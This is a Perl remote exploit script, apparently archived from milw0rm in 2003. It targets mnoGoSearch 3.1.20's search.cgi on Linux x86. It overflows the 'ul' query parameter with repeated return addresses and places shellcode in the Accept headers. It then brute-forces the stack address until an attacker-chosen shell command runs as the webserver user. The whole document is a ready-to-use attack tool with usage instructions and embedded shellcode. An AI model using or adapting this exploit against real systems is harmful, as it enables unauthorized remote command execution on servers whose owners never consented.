<html><head><title>mnoGoSearch 3.1.20 Remote Command Execution Exploit
</title></head><pre>#!/usr/bin/perl
# 
# [ reloaded ] 
# Remote Exploit for mnoGoSearch 3.1.20 that performs
# remote command execution as the webserver user id
# for linux ix86
# by pokleyzz
#

use IO::Socket;

$host = &quot;127.0.0.1&quot;;
$cmd  = &quot;ls -la&quot;;
$searchpath = &quot;/cgi-bin/search.cgi&quot;;
$rawret = 0xbfff105c;
$ret = &quot;&quot;;
$suffsize = 0;
$port = 80;

my $conn;


if ($ARGV[0]){
	$host = $ARGV[0];	
}
else {
	print &quot;[x] mnogosearch 3.1.x exploit for linux ix86 \n\tby pokleyzz\n\n&quot;;
	print &quot;Usage:\n mencari_sebuah_nama.pl host [command] [path] [port] [suff] [ret]\n&quot;;
	print &quot;\thost\thostname to exploit\n&quot;;
	print &quot;\tcommand\tcommand to execute on server\n&quot;;
	print &quot;\tpath\tpath to search.cgi default /cgi-bin/search.cgi\n&quot;;
	print &quot;\tport\tport to connect to\n&quot;;
	print &quot;\tsuff\tif not success try to use 1, 2 or 3 for suff (default is 0)\n&quot;;
	print &quot;\tret\treturn address default bfffd0d0\n&quot;;
	exit;
}

if ($ARGV[1]){
	$cmd = $ARGV[1];	
}
if ($ARGV[2]){
	$searchpath = $ARGV[2];	
}
if ($ARGV[3]){
	$port = int($ARGV[3]);	
}
if ($ARGV[4]){
	$suffsize = int($ARGV[4]);	
}	
if ($ARGV[5]){
	$rawret = hex_to_int($ARGV[5]);	
}

#########~~ start function ~~#########
sub hex_to_int {
	my $hs = $_[0];  
	$int = (hex(substr($hs, 0, 2)) &lt;&lt; 24) + (hex(substr($hs, 2, 2)) &lt;&lt; 16) +
                         (hex(substr($hs, 4, 2)) &lt;&lt; 8) + + hex(substr($hs, 6, 2));
	 	
}

sub int_to_hex {
	my $in = $_[0];
	$hex = sprintf &quot;%x&quot;,$in;
}

sub string_to_ret {
	my $rawret = $_[0];
	if (length($rawret) != 8){
		print $rawret;
		die &quot;[*] incorrect return address ...\n &quot;;
	} else {
		$ret = chr(hex(substr($rawret, 2, 2)));
		$ret .= chr(hex(substr($rawret, 0, 2)));
		$ret .= chr(hex(substr($rawret, 6, 2)));
    		$ret .= chr(hex(substr($rawret, 4, 2)));
    		
	}	
	
}

sub connect_to {
	#print &quot;[x] Connect to $host on port $port ...\n&quot;;
	$conn = IO::Socket::INET-&gt;new (
					Proto =&gt; &quot;tcp&quot;,
					PeerAddr =&gt; &quot;$host&quot;,
					PeerPort =&gt; &quot;$port&quot;,
					) or die &quot;[*] Can't connect to $host on port $port ...\n&quot;;
	$conn-&gt; autoflush(1);
}

sub check_version {
	my $result;
	connect_to();
	print &quot;[x] Check if $host use correct version ...\n&quot;;
	print $conn &quot;GET $searchpath?tmplt=/test/testing123 HTTP/1.1\nHost: $host\nConnection: Close\n\n&quot;; 
	
	# capture result              
	while ($line = &lt;$conn&gt;) { 
		$result .= $line;
		};
	
	close $conn;
	if ($result =~ /_test_/){
		print &quot;[x] Correct version detected .. possibly vulnerable ...\n&quot;;
	} else {
		print $result;
		die &quot;[x] New version or wrong url\n&quot;;
	}	
}

sub exploit {
	my $rw = $_[0];
	$result = &quot;&quot;;
	# linux ix86 shellcode rip from phx.c by proton
	$shellcode = &quot;\xeb\x3b\x5e\x8d\x5e\x10\x89\x1e\x8d\x7e\x18\x89\x7e\x04\x8d\x7e\x1b\x89\x7e\x08&quot;
	             .&quot;\xb8\x40\x40\x40\x40\x47\x8a\x07\x28\xe0\x75\xf9\x31\xc0\x88\x07\x89\x46\x0c\x88&quot;
	             .&quot;\x46\x17\x88\x46\x1a\x89\xf1\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
	             .&quot;\x80\xe8\xc0\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	             .&quot;\x41\x41&quot;
	             .&quot;/bin/sh -c echo 'Content-Type: text/hello';echo '';&quot;
	             .&quot;$cmd&quot;
	             .&quot;@&quot;;
	$strret = int_to_hex($rw);
	$ret = string_to_ret($strret);
	$envvar = 'B' x (4096 - length($shellcode));
	$envvar .= $shellcode;
	
	# generate query string
	$buffer = &quot;B&quot; x $suffsize;
	$buffer .= &quot;B&quot; x 4800;
	$buffer .= $ret x 200;
	
	$request = &quot;GET $searchpath?ul=$buffer HTTP/1.1\n&quot;
		   .&quot;Accept: $envvar\n&quot;
		   .&quot;Accept-Language: $envvar\n&quot;
		   .&quot;Accept-Encoding: $envvar\n&quot;
		   .&quot;User-Agent: Mozilla/4.0\n&quot;
		   .&quot;Host: $host\n&quot;
		   .&quot;Connection: Close\n\n&quot;;
	
	&amp;connect_to;
	print &quot;[x] Sending exploit code ..\n&quot;;
	print &quot;[x] ret: $strret\n&quot;;
	print &quot;[x] suf: $suffsize\n&quot;;
	print &quot;[x] length:&quot;,length($request),&quot;\n&quot;;
	print $conn &quot;$request&quot;;
	while ($line = &lt;$conn&gt;) { 
		$result .= $line;
		};
	close $conn;
	
}

sub check_result {
	if ($result =~ /hello/ &amp;&amp; !($result =~ /text\/html/)){
		print $result;
		$success = 1;
	} else {
		print $result;
		print &quot;[*] Failed ...\n&quot;;
		$success = 0;
	}
}
#########~~ end function ~~#########

&amp;check_version;
for ($rawret; $rawret &lt; 0xbfffffff;$rawret += 1024){
	&amp;exploit($rawret);
	&amp;check_result;
	if ($success == 1){
		exit;
	}
	sleep 1;
}

# milw0rm.com [2003-06-10]</pre></html>